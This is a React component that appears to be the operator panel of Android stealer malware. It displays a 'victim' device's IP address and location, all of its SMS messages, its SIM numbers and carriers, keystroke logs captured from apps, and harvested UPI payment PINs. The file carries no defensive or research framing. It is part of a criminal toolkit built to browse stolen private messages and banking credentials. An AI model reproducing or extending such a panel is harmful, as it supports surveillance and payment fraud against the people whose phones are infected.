import { useState, useEffect } from 'react';
import { X, Smartphone, MessageSquare, Phone, Keyboard, Shield } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { useDB } from '@/hooks/useDB';
import { getRelativeTime } from '@/utils/time';

interface DeviceDetailProps {
  victimId: string;
  onClose: () => void;
}

export function DeviceDetail({ victimId, onClose }: DeviceDetailProps) {
  const { db, getVictimMessages, getSims, getKeyLogs, getUPIs, getVictimMessageCount } = useDB();
  const device = db.DeviceInfo[victimId];
  
  // State for async data loading
  const [messages, setMessages] = useState<any[]>([]);
  const [sims, setSims] = useState<any[]>([]);
  const [keyLogs, setKeyLogs] = useState<any[]>([]);
  const [upiPins, setUpiPins] = useState<string[]>([]);
  const [loadingStates, setLoadingStates] = useState<Record<string, boolean>>({});

  // Load data when component mounts or victimId changes
  useEffect(() => {
    const loadAllData = async () => {
      setLoadingStates({ messages: true, sims: true, keyLogs: true, upiPins: true });
      
      try {
        const [messagesData, simsData, keyLogsData, upiPinsData] = await Promise.all([
          getVictimMessages(victimId), // Load ALL messages
          getSims(victimId),
          getKeyLogs(victimId, 200),
          getUPIs(victimId)
        ]);
        
        setMessages(messagesData);
        setSims(simsData);
        setKeyLogs(keyLogsData);
        setUpiPins(upiPinsData);
      } catch (error) {
        console.error('Error loading device data:', error);
      } finally {
        setLoadingStates({});
      }
    };

    if (victimId) {
      loadAllData();
    }
  }, [victimId, getVictimMessages, getSims, getKeyLogs, getUPIs]);


  if (!device) {
    return null;
  }

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 animate-fade-in">
      <div className="fixed right-0 top-0 h-full w-full max-w-2xl bg-background shadow-2xl animate-slide-up overflow-y-auto">
        {/* Header */}
        <div className="sticky top-0 bg-background/80 backdrop-blur-md border-b p-6 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
              <Smartphone className="w-5 h-5 text-white" />
            </div>
            <div>
              <h2 className="text-xl font-bold">{device.Model}</h2>
              <p className="text-sm text-muted-foreground">{device.VictimId}</p>
            </div>
          </div>
          <Button variant="ghost" size="icon" onClick={onClose}>
            <X className="w-5 h-5" />
          </Button>
        </div>

        {/* Content */}
        <div className="p-6">
          <Tabs defaultValue="overview" className="w-full">
            <TabsList className="grid w-full grid-cols-5">
              <TabsTrigger value="overview">Overview</TabsTrigger>
              <TabsTrigger value="messages">Messages</TabsTrigger>
              <TabsTrigger value="sims">SIMs</TabsTrigger>
              <TabsTrigger value="keylogs">Key logs</TabsTrigger>
              <TabsTrigger value="upipins">UPI pins</TabsTrigger>
            </TabsList>

            <TabsContent value="overview" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Smartphone className="w-5 h-5" />
                    Device Information
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-6">
                    {/* Device Information */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      <div className="space-y-4">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Status:</span>
                          <Badge variant={device.Status === 'Online' ? 'default' : 'secondary'}>
                            {device.Status}
                          </Badge>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">IP Address:</span>
                          <span className="font-medium">{device.IP}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Location:</span>
                          <span className="font-medium">{device.Location}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Last Seen:</span>
                          <span className="font-medium">{getRelativeTime(device.LastSeen)}</span>
                        </div>
                      </div>
                      <div className="space-y-4">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Apps Installed:</span>
                          <Badge variant="outline">{device.AppsInstalled}</Badge>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Battery:</span>
                          <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
                            {device.Battery}
                          </Badge>
                        </div>
                      </div>
                    </div>

                    {/* Device Brand, Model, and Android Version */}
                    <div className="border-t pt-6">
                      <h3 className="text-lg font-semibold mb-4">Device Specifications</h3>
                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Brand:</span>
                            <Badge variant="outline">{device.Brand || 'Unknown'}</Badge>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Model:</span>
                            <span className="font-medium font-mono">{device.Model || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Android Version:</span>
                            <Badge variant="outline">{device.AndroidVersion || 'Unknown'}</Badge>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="messages" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <MessageSquare className="w-5 h-5" />
                    Messages ({getVictimMessageCount(victimId)})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loadingStates.messages ? (
                    <div className="text-center py-8">
                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
                      <p className="text-sm text-muted-foreground">Loading messages...</p>
                    </div>
                  ) : messages.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No messages found</p>
                  ) : (
                    <div className="space-y-4">
                      <div className="max-h-96 overflow-y-auto space-y-0">
                        {messages.map((msg, idx) => (
                          <div key={idx} className="border-b border-gray-200 py-4 last:border-b-0">
                            <div className="flex items-start justify-between gap-3 mb-2">
                              <span className="font-medium text-sm text-gray-900">{msg.Sender}</span>
                              <div className="flex items-center gap-2">
                                <span className="text-xs bg-blue-100 text-blue-700 px-2 py-1 rounded">
                                  {msg.Type === 'Received' ? 'Old' : msg.Type === 'Sent' ? 'New' : msg.Type || 'Old'}
                                </span>
                                <span className="text-xs text-gray-500">
                                  {getRelativeTime(msg.Time)}
                                </span>
                              </div>
                            </div>
                            <div className="mt-2">
                              <p className="text-sm text-gray-700 leading-relaxed whitespace-pre-wrap break-words">{msg.Message || 'No message content'}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="sims" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Phone className="w-5 h-5" />
                    SIM Cards ({sims.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-6">
                    {/* Device SIM Numbers */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">Device SIM Numbers</h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">SIM 1:</span>
                            <span className="font-medium font-mono">{device.SimNumber1 || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">SIM 2:</span>
                            <span className="font-medium font-mono">{device.SimNumber2 || 'Unknown'}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Device Service Names */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">Device Service Names</h3>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Service 1:</span>
                            <span className="font-medium">{device.ServiceName1 || 'Unknown'}</span>
                          </div>
                        </div>
                        <div className="p-4 bg-muted/30 rounded-lg">
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Service 2:</span>
                            <span className="font-medium">{device.ServiceName2 || 'Unknown'}</span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* SIM Cards from Database */}
                    <div className="space-y-3">
                      <h3 className="text-lg font-semibold">SIM Cards from Database</h3>
                      {loadingStates.sims ? (
                        <div className="text-center py-8">
                          <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
                          <p className="text-sm text-muted-foreground">Loading SIM cards...</p>
                        </div>
                      ) : sims.length === 0 ? (
                        <p className="text-muted-foreground text-center py-8">No SIM cards found in database</p>
                      ) : (
                        <div className="space-y-4">
                          {sims.map((sim, idx) => (
                            <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
                              <div className="grid grid-cols-2 gap-4 text-sm">
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Phone Number:</span>
                                  <span className="font-medium">{sim.PhoneNumber}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Carrier:</span>
                                  <span className="font-medium">{sim.Carrier}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">Country:</span>
                                  <span className="font-medium">{sim.Country}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-muted-foreground">State:</span>
                                  <span className="font-medium">{sim.State}</span>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="keylogs" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Keyboard className="w-5 h-5" />
                    Key Logs ({keyLogs.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loadingStates.keyLogs ? (
                    <div className="text-center py-8">
                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
                      <p className="text-sm text-muted-foreground">Loading key logs...</p>
                    </div>
                  ) : keyLogs.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No key logs found</p>
                  ) : (
                    <div className="space-y-2 max-h-64 overflow-y-auto">
                      {keyLogs.map((log, idx) => (
                        <div key={idx} className="p-3 bg-muted/30 rounded border text-sm">
                          <div className="flex justify-between items-center mb-1">
                            <span className="font-medium">{log.App}</span>
                            <span className="text-xs text-muted-foreground">
                              {getRelativeTime(log.Time)}
                            </span>
                          </div>
                          <p className="text-muted-foreground font-mono text-xs">{log.Text}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="upipins" className="mt-6">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Shield className="w-5 h-5" />
                    UPI Pins ({upiPins.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loadingStates.upiPins ? (
                    <div className="text-center py-8">
                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-primary mx-auto mb-2"></div>
                      <p className="text-sm text-muted-foreground">Loading UPI pins...</p>
                    </div>
                  ) : upiPins.length === 0 ? (
                    <p className="text-muted-foreground text-center py-8">No UPI pins found</p>
                  ) : (
                    <div className="grid grid-cols-2 gap-4">
                      {upiPins.map((pin, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border text-center">
                          <span className="font-mono text-lg font-bold">{pin}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

          </Tabs>
        </div>
      </div>
    </div>
  );
}
